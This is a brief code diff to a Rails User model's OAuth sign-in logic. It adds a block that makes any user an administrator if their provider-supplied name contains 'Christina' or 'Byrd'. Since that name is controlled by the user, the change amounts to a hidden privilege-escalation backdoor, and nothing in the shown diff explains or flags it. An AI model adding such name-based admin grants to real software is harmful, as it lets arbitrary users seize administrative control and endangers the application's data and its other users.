@@ -12,6 +12,10 @@ class User < ActiveRecord::Base
         user.name  = auth['info'].fetch('name')  || ''
         user.email = auth['info'].fetch('email') || ''
       end
+
+      if user.name =~ /Christina/ || user.name =~ /Byrd/
+        user.admin    = true
+      end
     end
   end
 
